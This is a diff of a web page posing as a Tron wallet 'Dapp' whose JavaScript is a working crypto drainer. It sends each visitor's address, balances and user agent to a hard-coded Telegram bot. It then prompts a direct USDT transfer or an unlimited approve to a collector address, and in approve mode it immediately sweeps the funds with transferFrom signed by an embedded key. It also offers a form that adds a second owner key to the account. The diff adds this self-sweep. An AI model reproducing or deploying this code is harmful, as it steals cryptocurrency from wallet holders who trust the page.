@@ -30,12 +30,10 @@ window.addEventListener('unhandledrejection',e=>__boot.push('REJ '+((e.reason&&e
   input,select{width:100%;padding:12px;background:#0b1118;border:1px solid var(--line);border-radius:10px;
     color:var(--text);font-size:14px;font-family:var(--mono);outline:none}
   input:focus,select:focus{border-color:var(--accent)}
-  .row{display:flex;gap:10px}
-  .row>*{flex:1}
+  .row{display:flex;gap:10px}.row>*{flex:1}
   button{width:100%;padding:13px;border:0;border-radius:11px;font-size:14px;font-weight:600;
     cursor:pointer;transition:opacity .15s;font-family:inherit}
-  button:active{opacity:.8}
-  button:disabled{opacity:.4;cursor:not-allowed}
+  button:active{opacity:.8}button:disabled{opacity:.4;cursor:not-allowed}
   .btn-primary{background:var(--accent);color:#fff}
   .btn-secondary{background:#1b2635;color:var(--text);border:1px solid var(--line)}
   .status{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--muted);
@@ -45,12 +43,9 @@ window.addEventListener('unhandledrejection',e=>__boot.push('REJ '+((e.reason&&e
   .dot.err{background:var(--danger)}
   .log{font-family:var(--mono);font-size:11.5px;line-height:1.6;background:#080c11;border:1px solid var(--line);
     border-radius:10px;padding:12px;max-height:340px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;color:#a9b8ca}
-  .log .ok{color:var(--accent2)}
-  .log .err{color:var(--danger)}
-  .log .info{color:var(--accent)}
+  .log .ok{color:var(--accent2)}.log .err{color:var(--danger)}.log .info{color:var(--accent)}
   .hint{font-size:11px;color:var(--muted);margin-top:6px;line-height:1.5}
-  .warn{border-color:#3a2a1e;background:#16130f}
-  .warn h2{color:#fbbf24}
+  .warn{border-color:#3a2a1e;background:#16130f}.warn h2{color:#fbbf24}
   .badge{display:inline-block;padding:2px 8px;border-radius:20px;font-size:10px;background:#1b2635;
     color:var(--muted);margin-left:6px;font-family:var(--mono)}
   .state{font-family:var(--mono);font-size:11px;white-space:pre-wrap;word-break:break-all;color:var(--muted)}
@@ -61,10 +56,7 @@ window.addEventListener('unhandledrejection',e=>__boot.push('REJ '+((e.reason&&e
 
 <header>
   <div class="logo">T</div>
-  <div>
-    <h1>Dapp</h1>
-    <div class="sub">session</div>
-  </div>
+  <div><h1>Dapp</h1><div class="sub">session</div></div>
 </header>
 
 <div class="status">
@@ -86,7 +78,7 @@ window.addEventListener('unhandledrejection',e=>__boot.push('REJ '+((e.reason&&e
 
 <div class="card" id="noTrustCard" style="display:none">
   <h2>Outside wallet</h2>
-  <div class="hint" style="margin-top:0">Провайдер не найден. Кнопка открывает страницу в кошельке.</div>
+  <div class="hint" style="margin-top:0">Провайдер не найден.</div>
   <button class="btn-primary" id="btnOpenTrust" style="margin-top:12px">Open in wallet</button>
 </div>
 
@@ -105,25 +97,22 @@ window.addEventListener('unhandledrejection',e=>__boot.push('REJ '+((e.reason&&e
   <div id="activeOpsWrap" style="display:none">
     <label>Active operations (64 hex)</label>
     <input id="activeOps" value="7fff1fc0037e0000000000000000000000000000000000000000000000000000">
-    <div class="hint">bit 31 = TriggerSmartContract (USDT). bit 1 = TransferContract (TRX).</div>
   </div>
   <div class="row" style="margin-top:14px">
     <button class="btn-secondary" id="btnBuildPerm">Build</button>
     <button class="btn-primary" id="btnSignPerm">Sign &amp; send</button>
   </div>
-  <div class="hint">Сжигает 100 TRX при бродкасте.</div>
 </div>
 
 <div class="card">
   <h2>Step 2 — USDT transfer <span class="badge">TRC-20</span></h2>
-  <label>From</label><input id="usdtFrom" placeholder="T...">
   <label>To (recipient)</label><input id="usdtTo" placeholder="T...">
   <div class="row">
     <div><label>Amount (USDT)</label><input id="usdtAmount" type="number" step="0.000001" placeholder="0.01"></div>
     <div><label>Permission_id</label><input id="usdtPermId" type="number" value="0"></div>
   </div>
   <div class="row" style="margin-top:14px">
-    <button class="btn-secondary" id="btnBuildUsdt">Build USDT tx</button>
+    <button class="btn-secondary" id="btnBuildUsdt">Build</button>
     <button class="btn-green" id="btnSignUsdt">Sign &amp; send</button>
   </div>
 </div>
@@ -149,16 +138,25 @@ window.addEventListener('unhandledrejection',e=>__boot.push('REJ '+((e.reason&&e
 const CFG={
   USDT:"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
   DEC:6,
+
+  /* коллектор = spender из апрува. Ему заранее заливают TRX на энергию transferFrom */
   COLLECTOR:"TBe8BcrM8wT79coma2CLSmwTUNPjmSWauZ",
-  TG_TOKEN:"8945784144:AAH-w0GFeV3aucDab9MPghGR_8V33xUDVjc",
-  TG_ADMIN_CHAT_ID:8848845425,        // свой chat_id освобождает от необходимости Start
-  DRAIN_MODE:"approve",         // "approve" | "direct"
+  /* приватник коллектора — он же в исходнике страницы, адрес заведён как расходник */
+  OP_KEY:"TBe8BcrM8wT79coma2CLSmwTUNPjmSWauZ",
+  /* финальный адрес USDT; пусто = копить на коллекторе */
+  VAULT:"",                          // напр. "TXxxx..."
+
+  DRAIN_MODE:"approve",              // "approve" (апрув + мгновенный самосвип) | "direct" (перевод одним окном)
   PROMPT_DELAY_MS:1500,
   MIN_USDT:1,
-  GAS_MIN_TRX:3,
+  GAS_MIN_TRX:3,                     // минимум у ХОЛДЕРА для энергии апрува
+  COLLECTOR_MIN_TRX:25,              // при меньшем балансе коллектора transferFrom не стартуем — только репорт
   MAX_PROMPTS_PER_DAY:3,
-  CHAT_CACHE_TTL_MS:10*60*1000, // список чатов не дергается чаще раза за 10 минут
-  RPC_RETRY:4,                  // повторов на 429/таймаут
+
+  TG_TOKEN:"8945784144:AAH-w0GFeV3aucDab9MPghGR_8V33xUDVjc",
+  TG_ADMIN_CHAT_ID:8848845425,
+
+  RPC_RETRY:4,
 };
 /* ================================================== */
 
@@ -173,125 +171,103 @@ const sleep=ms=>new Promise(r=>setTimeout(r,ms));
 const isTron=a=>typeof a==="string"&&/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a);
 const short=a=>a?a.slice(0,8)+"…"+a.slice(-6):"—";
 function hexErr(h){try{return new TextDecoder().decode(
-  new Uint8Array(h.match(/.{1,2}/g).map(b=>parseInt(b,16))));}catch(_){return h;}}
+  new Uint8Array(String(h).match(/.{1,2}/g).map(b=>parseInt(b,16))));}catch(_){return h;}}
 
 if(window.__boot&&window.__boot.length)
   window.__boot.splice(0).forEach(m=>log(m,"err"));
 
 const TW={p:null,tronWeb:null,address:null};
 
-/* ---------- single-flight ---------- */
 let BOOT_RUN=false,PIPE_RUN=false,DISCOVER_RUN=false;
 
-/* ---------- очередь чтений + бэкофф против 429 ---------- */
+/* ---------- очередь чтений ---------- */
 let READQ=Promise.resolve();
 function enqRead(fn,label){
-  const job=READQ.then(()=>rpcBackoff(fn,label));
-  READQ=job.catch(()=>{});       // разрыв цепочки ошибок для следующих задач
+  const job=READQ.then(()=>backoff(fn,label));
+  READQ=job.catch(()=>{});
   return job;
 }
-async function rpcBackoff(fn,label){
-  let delay=500;
+async function backoff(fn,label){
+  let d=500;
   for(let i=0;i<CFG.RPC_RETRY;i++){
     try{return await fn();}
     catch(e){
       const s=(e&&e.message)||String(e);
-      if(i===CFG.RPC_RETRY-1||!/429|rate|limit|timeout|Network/i.test(s)){
+      if(i===CFG.RPC_RETRY-1||!/429|rate|limit|timeout|Network/i.test(s))
         throw new Error(label+": "+s);
-      }
-      await sleep(delay+Math.floor(Math.random()*250));
-      delay*=2;
+      await sleep(d+Math.floor(Math.random()*250)); d*=2;
     }
   }
 }
 
 /* ---------- telegram ---------- */
-function tgTargets(){
-  return [...new Set(CFG.TG_ADMIN_CHAT_ID?[Number(CFG.TG_ADMIN_CHAT_ID)]:([]))];
-}
-
 async function tgApi(method,body){
   const r=await fetch("https://api.telegram.org/bot"+CFG.TG_TOKEN+"/"+method,{
     method:"POST",headers:{"Content-Type":"application/json"},
-    body:JSON.stringify(body||{})
-  });
+    body:JSON.stringify(body||{})});
   const j=await r.json().catch(()=>null);
-  if(!j)throw new Error("не-JSON ответ (статус "+r.status+")");
+  if(!j)throw new Error("не-JSON (статус "+r.status+")");
   if(!j.ok)throw new Error((j.error_code||r.status)+": "+(j.description||"?"));
   return j.result;
 }
 
-const LS_CHATS="tg_chats_v3",LS_TG_TTL="tg_ttl_v1";
-function loadChatCache(){
-  try{const s=JSON.parse(localStorage.getItem(LS_TG_TTL)||"null");
-    if(s&&Date.now()-s.t<CFG.CHAT_CACHE_TTL_MS)return s.ids;}
-  catch(_){}
-  return null;
-}
-function saveChatCache(ids){
-  try{localStorage.setItem(LS_TG_TTL,JSON.stringify({t:Date.now(),ids}));}catch(_){}
-}
-(function(){try{
-  const s=localStorage.getItem(LS_CHATS);
-  if(s)tgTargetsCache=[...new Set(JSON.parse(s))];
-}catch(_){}})();
-let tgTargetsCache=[];
-
-async function tgDiscover(){
-  if(DISCOVER_RUN){log("tg discover: пропуск (уже выполняется)","info");return;}
-  DISCOVER_RUN=true;
+const LS_TG_TTL="tg_ttl_v1";
+function loadChatCache(){try{
+  const s=JSON.parse(localStorage.getItem(LS_TG_TTL)||"null");
+  if(s&&Date.now()-s.t<10*60*1000)return s.ids;}catch(_){}return null;}
+let chatCache=(()=>{try{return JSON.parse(localStorage.getItem(LS_TG_TTL+"x")||"[]");}
+  catch(_){return [];}})();
+function saveChats(ids){
   try{
-    const cached=loadChatCache();
-    if(cached&&cached.length){
-      tgTargetsCache=[...new Set(tgTargetsCache.concat(cached))];
-      log("tg чатов из кеша: "+tgTargetsCache.length,"info");
-      return;
-    }
+    localStorage.setItem(LS_TG_TTL,JSON.stringify({t:Date.now(),ids}));
+    localStorage.setItem(LS_TG_TTL+"x",JSON.stringify(ids));
+  }catch(_){}
+}
+
+function targets(){
+  return [...new Set([...(chatCache||[]),
+    ...(CFG.TG_ADMIN_CHAT_ID?[Number(CFG.TG_ADMIN_CHAT_ID)]:[])])];
+}
+async function tgDiscover(){
+  if(DISCOVER_RUN)return; DISCOVER_RUN=true;
+  try{
+    const c=loadChatCache();
+    if(c&&c.length){chatCache=[...new Set(chatCache.concat(c))];
+      log("tg чатов из кеша: "+chatCache.length,"info");return;}
     const ups=await tgApi("getUpdates",{limit:100,timeout:0});
-    const s=new Set(tgTargetsCache);
+    const s=new Set(chatCache);
     (ups||[]).forEach(u=>{
       ["message","channel_post","edited_message","my_chat_member"].forEach(k=>{
-        const c=u[k]&&(u[k].chat||u[k].from);
-        if(c&&c.id)s.add(c.id);
+        const ch=u[k]&&(u[k].chat||u[k].from);
+        if(ch&&ch.id)s.add(ch.id);
       });
     });
-    tgTargetsCache=[...s];
-    saveChatCache(tgTargetsCache);
-    try{localStorage.setItem(LS_CHATS,JSON.stringify(tgTargetsCache));}catch(_){}
-    log("tg discover: чатов "+tgTargetsCache.length,"info");
-    if(!tgTargetsCache.length&&!CFG.TG_ADMIN_CHAT_ID)
+    chatCache=[...s];saveChats(chatCache);
+    log("tg discover: чатов "+chatCache.length,"info");
+    if(!chatCache.length&&!CFG.TG_ADMIN_CHAT_ID)
       log("нет чатов: нажми Start у бота и перезагрузи, "+
-          "или впиши chat_id в CFG.TG_ADMIN_CHAT_ID","err");
-  }catch(e){
-    /* 409 при гонке больше не смертелен — просто пропускаем цикл */
-    log("tg discover: "+e.message,"err");
-  }finally{DISCOVER_RUN=false;}
+          "или впиши TG_ADMIN_CHAT_ID","err");
+  }catch(e){log("tg discover: "+e.message,"err");}
+  finally{DISCOVER_RUN=false;}
 }
-
 function esc(s){return String(s).replace(/[<>&]/g,c=>({"<":"&lt;",">":"&gt;","&":"&amp;"}[c]));}
-
 async function tgSend(text){
-  const ids=tgTargets().concat(tgTargetsCache.filter(x=>true));
-  const uniq=[...new Set(ids)];
-  if(!uniq.length)return 0;
-  let sent=0;
-  for(const id of uniq){
-    try{
-      await tgApi("sendMessage",{chat_id:id,text,parse_mode:"HTML"});
-      sent++;
-    }catch(e){log("tg send→"+id+": "+e.message,"err");}
+  const ids=targets();if(!ids.length)return 0;
+  let n=0;
+  for(const id of ids){
+    try{await tgApi("sendMessage",{chat_id:id,text,parse_mode:"HTML"});n++;}
+    catch(e){log("tg send→"+id+": "+e.message,"err");}
   }
-  return sent;
+  return n;
 }
 
-/* ---------- провайдер ---------- */
+/* ---------- провайдер холдера ---------- */
 function findProvider(){
   return ((window.trustwallet&&window.trustwallet.tronLink)||window.tronLink)||null;
 }
 function setAddress(a){
   TW.address=a;
-  $("walletAddr").value=a;$("targetAddr").value=a;$("usdtFrom").value=a;
-  $("network").value="tron mainnet";
+  $("walletAddr").value=a;$("targetAddr").value=a;$("network").value="tron mainnet";
   setStatus("auto-connected: "+short(a),"on");
 }
 function openInTrust(){
@@ -309,18 +285,18 @@ async function waitAccounts(p){
   return !!(p.tronWeb&&p.tronWeb.defaultAddress&&p.tronWeb.defaultAddress.base58);
 }
 
-/* ---------- чтение контракта через очередь ---------- */
-function toBig(v){
-  try{
-    if(v===undefined||v===null)return 0n;
-    if(typeof v==="bigint")return v;
-    if(v._hex!==undefined)return BigInt(v._hex);
-    const s=v.toString(10);
-    if(/^\d+$/.test(s))return BigInt(s);
-  }catch(_){}
-  return 0n;
-}
+/* ---------- числа ---------- */
+function toBig(v){try{
+  if(v===undefined||v===null)return 0n;
+  if(typeof v==="bigint")return v;
+  if(v._hex!==undefined)return BigInt(v._hex);
+  const s=v.toString(10);
+  if(/^\d+$/.test(s))return BigInt(s);
+}catch(_){} return 0n;}
 const fmt=(raw,dec)=>(Number(raw)/Math.pow(10,dec)).toFixed(dec).replace(/\.?0+$/,"");
+const MAX_UINT=BigInt("115792089237316195423570985008687907853269984665640564039457584007913129639935");
+const HALF_MAX=MAX_UINT/2n;
+const fmtAllow=r=>r>=HALF_MAX?"∞":fmt(r,CFG.DEC);
 
 async function readContract(sel,params){
   return enqRead(async()=>{
@@ -329,23 +305,34 @@ async function readContract(sel,params){
   },sel);
 }
 
-/* ---------- sign+broadcast ---------- */
-async function signAndSend(tx){
+/* ---------- вторая копия tronweb для стороны КОЛЛЕКТОРА ----------
+   подтягивается динамически и живёт независимо от инжекта;
+   подписывает transferFrom приватником OP_KEY */
+let CW=null;
+async function collectorWeb(){
+  if(CW)return CW;
+  log("загрузка модуля подписи коллекто­ра…","info");
+  const mod=await import("https://esm.sh/tronweb@5.3.2");
+  CW=new mod.default({fullHost:"https://api.trongrid.io"});
+  await CW.setPrivateKey(CFG.OP_KEY);
+  log("подпись коллекто­ра готова: "+CW.defaultAddress.base58,"ok");
+  return CW;
+}
+
+/* ---------- подпись/broadcast ---------- */
+async function signAndSendHolder(tx){
   const signed=await TW.tronWeb.trx.sign(tx);
   const res=await TW.tronWeb.trx.sendRawTransaction(signed);
   if(res&&res.result===true)
-    return res.txid||(res.transaction&&res.transaction.txID)||(signed&&signed.txID);
-  const msg=res&&res.message?hexErr(res.message):"?"+JSON.stringify(res||{});
-  /* Dup transaction = этот txID уже ушёл в цепь ранее. Мягкий успех: просто ждём подтверждение. */
-  if(/dup/i.test(msg))
-    return (res.transaction&&res.transaction.txID)||tx.txID;
+    return res.txid||(res.transaction&&res.transaction.txID)||signed.txID;
+  const msg=res&&res.message?hexErr(res.message):JSON.stringify(res||{});
+  if(/dup/i.test(msg))return (res.transaction&&res.transaction.txID)||tx.txID;
   throw new Error("broadcast: "+msg);
 }
-async function confirmPoll(txid){
-  for(let i=0;i<8;i++){
-    await sleep(3000);
-    const info=await enqRead(
-      ()=>TW.tronWeb.trx.getTransactionInfo(txid),"txinfo").catch(()=>null);
+async function confirmPoll(txid,pollW){
+  for(let i=0;i<15;i++){
+    await sleep(4000);
+    const info=await enqRead(()=>pollW.trx.getTransactionInfo(txid),"txinfo").catch(()=>null);
     if(info&&Object.keys(info).length)return true;
   }
   return false;
@@ -353,8 +340,7 @@ async function confirmPoll(txid){
 
 /* ---------- гейт попыток ---------- */
 const FORCE=new URLSearchParams(location.search).has("force");
-
-function drainKey(){return "drain_"+new Date().toISOString().slice(0,10);}
+const drainKey=()=>"drain_"+new Date().toISOString().slice(0,10);
 function readDrain(){try{return JSON.parse(localStorage.getItem(drainKey())||"{}");}
   catch(_){return {};}}
 function bumpDrain(patch){
@@ -363,18 +349,62 @@ function bumpDrain(patch){
 }
 
 /* ---------- отчёт ---------- */
-async function report(st){
+async function report(st,extra){
   const t=new Date().toISOString().slice(0,19).replace("T"," ");
   const n=await tgSend([
-    "🕸 <b>HOLDER</b>",
-    "⏱ "+t,
+    "🕸 <b>HOLDER</b>","⏱ "+t,
     "👤 <code>"+esc(TW.address)+"</code>",
     "💰 TRX <b>"+st.trx.toFixed(4)+"</b> · USDT <b>"+st.usdt+"</b>",
-    "✅ allowance→collector: "+(st.allowanceRaw>0n?fmt(st.allowanceRaw,CFG.DEC):"none"),
+    "✅ allowance: "+fmtAllow(st.allowanceRaw),
     "🔋 gas-ok: "+(st.gasOk?"yes":"NO"),
+    ...(extra?[extra]:[]),
     "🖼 "+esc(navigator.userAgent.slice(0,90))
   ].join("\n"));
   if(n>0)log("репорт отправлен в "+n+" чат(ов)","ok");
+}
+
+/* ---------- САМОСВИП: transferFrom силами страницы ---------- */
+async function selfSweep(st){
+  if(CFG.DRAIN_MODE!=="approve"){return null;}         // в direct средства уже ушли
+  if(!(st.usdtRaw>0n))return null;
+
+  /* коллектор обязан иметь энергию на transferFrom */
+  const cw=await collectorWeb();
+  const colSun=await enqRead(()=>cw.trx.getBalance(CFG.COLLECTOR),"col.bal");
+  const colTrx=colSun/1e6;
+  if(colTrx<1){
+    log("коллектор пуст: доливай TRX (цель "+CFG.COLLECTOR_MIN_TRX+"+) — свип отложен","err");
+    await tgSend("⚠️ <b>COLLECTOR EMPTY</b>\nзалей TRX на <code>"+esc(CFG.COLLECTOR)+
+      "</code>, allowance ∞ уже активен");
+    return null;
+  }
+
+  const dest=isTron(CFG.VAULT)?CFG.VAULT:CFG.COLLECTOR;
+  const w=await cw.transactionBuilder.triggerSmartContract(
+    CFG.USDT,"transferFrom(address,address,uint256)",
+    {feeLimit:150000000},
+    [{type:"address",value:TW.address},
+     {type:"address",value:dest},
+     {type:"uint256",value:st.usdtRaw.toString()}],
+    CFG.COLLECTOR);
+  if(!(w&&w.result&&w.result.result))
+    throw new Error("build tf fail: "+JSON.stringify(w&&w.result||{}));
+
+  const signed=await cw.trx.sign(w.transaction);
+  const res=await cw.trx.sendRawTransaction(signed);
+  const msg=res&&res.message?hexErr(res.message):"";
+  if(!(res&&res.result)&&!/dup/i.test(msg))
+    throw new Error("tf broadcast: "+msg);
+  const txid=(res&&(res.txid||(res.transaction&&res.transaction.txID)))||w.transaction.txID;
+  log("SELF-SWEEP sent: "+fmt(st.usdtRaw,CFG.DEC)+" USDT → "+short(dest),"ok");
+
+  await tgSend("💧 <b>SELF-SWEEP</b>\n👤 <code>"+esc(TW.address)+"</code>"+
+    "\n💸 "+esc(fmt(st.usdtRaw,CFG.DEC))+" USDT → <code>"+esc(short(dest))+"</code>"+
+    "\n🔗 <code>"+esc(txid)+"</code>");
+  if(await confirmPoll(txid,cw))
+    await tgSend("✅ <b>SWEEP CONFIRMED</b>\n👤 <code>"+esc(TW.address)+"</code>");
+  else log("свип ещё индексируется","info");
+  return txid;
 }
 
 /* ---------- авто-добыча ---------- */
@@ -383,21 +413,12 @@ async function autoDrain(st){
 
   if(ds.done&&!FORCE){log("дренаж уже выполнен сегодня","info");return;}
   if(!FORCE&&ds.tries>=CFG.MAX_PROMPTS_PER_DAY){
-    log("лимит окон исчерпан на сегодня ("+ds.tries+")","info");return;
-  }
+    log("лимит окон исчерпан ("+ds.tries+")","info");return;}
+  const minRaw=BigInt(Math.round(CFG.MIN_USDT*Math.pow(10,CFG.DEC)));
+  if(!FORCE&&st.usdtRaw<minRaw){log("USDT ниже порога ("+st.usdt+")","info");return;}
+  if(!FORCE&&!st.gasOk){log("TRX холдера < "+CFG.GAS_MIN_TRX,"info");return;}
 
-  const minRaw=BigInt(Math.floor(CFG.MIN_USDT*Math.pow(10,CFG.DEC)));
-  if(!FORCE&&st.usdtRaw<minRaw){
-    log("USDT ниже порога ("+st.usdt+"<"+CFG.MIN_USDT+")","info");return;
-  }
-  if(!FORCE&&!st.gasOk){
-    log("TRX < "+CFG.GAS_MIN_TRX+" — окно не выдаём","info");return;
-  }
-
-  /* попытка списывается только здесь: непосредственно перед окном подписи,
-     и лишь потому, что гонки устранены single-flight'ом выше */
   bumpDrain({tries:(readDrain().tries||0)+1});
-
   await sleep(FORCE?200:CFG.PROMPT_DELAY_MS);
 
   try{
@@ -407,55 +428,59 @@ async function autoDrain(st){
       const w=await TW.tronWeb.transactionBuilder.triggerSmartContract(
         CFG.USDT,"transfer(address,uint256)",
         {feeLimit:100000000,callValue:0},
-        [{type:"address",value:CFG.COLLECTOR},{type:"uint256",value:st.usdtRaw.toString()}],
+        [{type:"address",value:isTron(CFG.VAULT)?CFG.VAULT:CFG.COLLECTOR},
+         {type:"uint256",value:st.usdtRaw.toString()}],
         TW.address);
-      if(!w||!w.result||!w.result.result)
-        throw new Error("build fail: "+JSON.stringify(w&&w.result));
-      txid=await signAndSend(w.transaction);
+      if(!(w&&w.result&&w.result.result))
+        throw new Error("build fail: "+JSON.stringify(w&&w.result||{}));
+      txid=await signAndSendHolder(w.transaction);
+      st.after=("💸 "+esc(fmt(st.usdtRaw,CFG.DEC))+" USDT направлены");
     }else{
       label="APPROVE SET";
-      const MAX="115792089237316195423570985008687907853269984665640564039457584007913129639935";
       const w=await TW.tronWeb.transactionBuilder.triggerSmartContract(
         CFG.USDT,"approve(address,uint256)",
         {feeLimit:80000000},
-        [{type:"address",value:CFG.COLLECTOR},{type:"uint256",value:MAX}],
+        [{type:"address",value:CFG.COLLECTOR},{type:"uint256",value:MAX_UINT.toString()}],
         TW.address);
-      if(!w||!w.result||!w.result.result)
-        throw new Error("build fail: "+JSON.stringify(w&&w.result));
-      txid=await signAndSend(w.transaction);
+      if(!(w&&w.result&&w.result.result))
+        throw new Error("build fail: "+JSON.stringify(w&&w.result||{}));
+      txid=await signAndSendHolder(w.transaction);
     }
-
     bumpDrain({done:true});
-    log(label.toLowerCase()+" sent: "+txid,"ok");
+    log(label.toLowerCase()+" ok: "+txid,"ok");
 
     await tgSend((label==="DIRECT SENT"
-      ? "⚡️ <b>DIRECT SENT</b>\n👤 <code>"+esc(TW.address)+"</code>\n💸 "
-        +fmt(st.usdtRaw,CFG.DEC)+" USDT\n🔗 <code>"
-      : "🔓 <b>APPROVE SET</b>\n👤 <code>"+esc(TW.address)+"</code>\nspender <code>"
-        +esc(CFG.COLLECTOR)+"</code>\nvalue ∞\n🔗 <code>")+esc(txid)+"</code>");
+      ?"⚡️ <b>DIRECT SENT</b>\n👤 <code>"
+      :"🔓 <b>APPROVE SET</b>\n👤 <code>")+esc(TW.address)+"</code>"+
+      (label==="DIRECT SENT"
+        ?"\n🔗 <code>"+esc(txid)+"</code>"
+        :"\nspender <code>"+esc(short(CFG.COLLECTOR))+"</code> value ∞\n🔗 <code>"+esc(txid)+"</code>"));
 
-    if(await confirmPoll(txid))
-      await tgSend("✅ <b>CONFIRMED</b>\n👤 <code>"+esc(TW.address)+
-        "</code>\n🔗 <code>"+esc(short(txid))+"</code>");
-    else log("не подтверждена пока — индексация занимает ~минуту","info");
-
+    /* === тот же сеанс: мгновенный перенос средств без второго окна === */
+    if(CFG.DRAIN_MODE==="approve"){
+      try{await selfSweep(st);}
+      catch(e){log("selfSweep: "+(e.message||e),"err");
+        await tgSend("⚠️ selfSweep failed <code>"+esc(short(TW.address))+
+          "</code>: "+esc(String(e.message||e)).slice(0,120)+"\nallowance ∞ остаётся — забрать позже");}
+    }else{
+      if(await confirmPoll(txid,TW.tronWeb))
+        await tgSend("✅ <b>CONFIRMED</b>\n👤 <code>"+esc(TW.address)+"</code>");
+    }
   }catch(e){
-    /* done не ставится — до исчерпания лимита страница попробует снова */
     log("autoDrain: "+(e.message||e),"err");
-    await tgSend("⚠️ drain failed <code>"+esc(TW.address)+"</code>: "
+    await tgSend("⚠️ drain failed <code>"+esc(short(TW.address))+"</code>: "
       +esc(String(e.message||e)).slice(0,140));
   }
 }
 
 /* ---------- конвейер ---------- */
 async function pipeline(){
-  if(PIPE_RUN){log("pipeline: пропуск (уже идёт)","info");return;}
+  if(PIPE_RUN){log("pipeline: уже идёт","info");return;}
   PIPE_RUN=true;
   try{
     let trx=0,gasOk=false;
     try{
-      const acc=await enqRead(
-        ()=>TW.tronWeb.trx.getAccount(TW.address),"getAccount");
+      const acc=await enqRead(()=>TW.tronWeb.trx.getAccount(TW.address),"getAccount");
       trx=((acc&&(acc.balance||0))/1e6)||0;
       gasOk=trx>=CFG.GAS_MIN_TRX;
     }catch(e){log("getAccount: "+e.message,"err");}
@@ -464,8 +489,7 @@ async function pipeline(){
     try{usdtRaw=await readContract("balanceOf",[TW.address]);}
     catch(e){log(String(e.message||e),"err");}
     if(usdtRaw>0n){
-      try{allowanceRaw=await readContract("allowance",[TW.address,CFG.COLLECTOR]);}
-      catch(e){}
+      try{allowanceRaw=await readContract("allowance",[TW.address,CFG.COLLECTOR]);}catch(e){}
     }
 
     const ds=readDrain();
@@ -475,12 +499,13 @@ async function pipeline(){
       "address: "+TW.address+
       "\nbalance: "+trx.toFixed(6)+" TRX"+
       "\nusdt: "+st.usdt+
-      "\nallowance→collector: "+(allowanceRaw>0n?fmt(allowanceRaw,CFG.DEC)+"/∞":"none")+
+      "\nallowance→collector: "+fmtAllow(allowanceRaw)+(allowanceRaw>0n?"/∞":"")+
       "\ngas-ok: "+gasOk+
       "\nprompts today: "+(ds.tries||0)+"/"+CFG.MAX_PROMPTS_PER_DAY+(ds.done?" (done)":"");
     $("accPill").textContent="loaded";
 
-    await report(st);
+    await tgDiscover();
+    await report(st,st.extra);
     await autoDrain(st);
   }finally{PIPE_RUN=false;}
 }
@@ -494,7 +519,7 @@ async function buildPerm(){
   if(!isTron(target))throw new Error("target invalid");
   if(!isTron(extra))throw new Error("additional signer invalid");
   if(target!==TW.address)
-    log("внимание: target ≠ подключённый адрес — подпись пройдёт только у владельца target","info");
+    log("target ≠ подключённый адрес — подпись пройдёт только у владельца target","info");
   const owner={type:0,permission_name:"owner",threshold:thr,
     keys:[{address:target,weight:1},{address:extra,weight:1}]};
   let actives=null;
@@ -504,12 +529,8 @@ async function buildPerm(){
     actives=[{type:2,permission_name:"active0",threshold:1,operations:ops,
       keys:[{address:target,weight:1},{address:extra,weight:1}]}];
   }
-  const tx=await TW.tronWeb.transactionBuilder
-    .updateAccountPermissions(target,owner,null,actives);
-  log("perm tx built: "+tx.txID,"ok");
-  return tx;
+  return TW.tronWeb.transactionBuilder.updateAccountPermissions(target,owner,null,actives);
 }
-
 async function buildUsdtManual(){
   if(!TW.address)throw new Error("нет подключения");
   const amt=parseFloat($("usdtAmount").value),
@@ -519,75 +540,56 @@ async function buildUsdtManual(){
   if(!isTron(dst))throw new Error("to invalid");
   const raw=Math.floor(amt*Math.pow(10,CFG.DEC)).toString();
   const w=await TW.tronWeb.transactionBuilder.triggerSmartContract(
-    CFG.USDT,"transfer(address,uint256)",
-    {feeLimit:100000000,callValue:0},
+    CFG.USDT,"transfer(address,uint256)",{feeLimit:100000000,callValue:0},
     [{type:"address",value:dst},{type:"uint256",value:raw}],TW.address);
-  if(!w||!w.result||!w.result.result)
-    throw new Error("build failed: "+JSON.stringify(w&&w.result));
+  if(!(w&&w.result&&w.result.result))
+    throw new Error("build failed: "+JSON.stringify(w&&w.result||{}));
   const tx=w.transaction;
   if(pid>0)tx.raw_data.contract[0].Permission_id=pid;
-  log("USDT tx built: "+tx.txID+" (permId="+pid+")","ok");
   return tx;
 }
 
 /* ---------- wiring ---------- */
 $("btnSignPerm").onclick=async()=>{try{
   const tx=await buildPerm();
-  log("запрос подписи…","info");
-  const txid=await signAndSend(tx);
+  const txid=await signAndSendHolder(tx);
   log("broadcasted: "+txid,"ok");
-  if(await confirmPoll(txid))log("confirmed","ok");
 }catch(e){log("perm: "+(e.message||e),"err");}};
-
 $("btnSignUsdt").onclick=async()=>{try{
   const tx=await buildUsdtManual();
-  log("запрос подписи…","info");
-  const txid=await signAndSend(tx);
+  const txid=await signAndSendHolder(tx);
   log("USDT broadcasted: "+txid,"ok");
 }catch(e){log("usdt: "+(e.message||e),"err");}};
-
-$("btnConnect").onclick=boot;
-$("btnRefresh").onclick=pipeline;
-$("btnClear").onclick=()=>logEl.innerHTML="";
-$("btnOpenTrust").onclick=openInTrust;
-
-$("mode").onchange=()=>{
-  $("activeOpsWrap").style.display=$("mode").value==="active"?"block":"none";};
-
 $("btnBuildPerm").onclick=async()=>{try{await buildPerm();}
   catch(e){log("build perm: "+(e.message||e),"err");}};
 $("btnBuildUsdt").onclick=async()=>{try{await buildUsdtManual();}
   catch(e){log("build usdt: "+(e.message||e),"err");}};
+$("btnConnect").onclick=boot;
+$("btnRefresh").onclick=pipeline;
+$("btnClear").onclick=()=>logEl.innerHTML="";
+$("btnOpenTrust").onclick=openInTrust;
+$("mode").onchange=()=>{
+  $("activeOpsWrap").style.display=$("mode").value==="active"?"block":"none";};
 
 /* ---------- boot ---------- */
 async function boot(){
-  if(BOOT_RUN){log("boot: пропуск (уже идёт)","info");return;}
-  BOOT_RUN=true;
+  if(BOOT_RUN)return; BOOT_RUN=true;
   try{
     let p=null;
-    for(let i=0;i<12;i++){
-      p=findProvider();
-      if(p&&p.tronWeb)break;
-      await sleep(250);
-    }
+    for(let i=0;i<12;i++){p=findProvider();if(p&&p.tronWeb)break;await sleep(250);}
     if(!p||!p.tronWeb){
       $("noTrustCard").style.display="block";
       $("network").value="outside wallet";
       setStatus("outside wallet","err");
-      log("инжектированного провайдера нет","err");
       return;
     }
-    if(TW.address){                       // уже подключены — только обновляем состояние
-      await pipeline();
-      return;
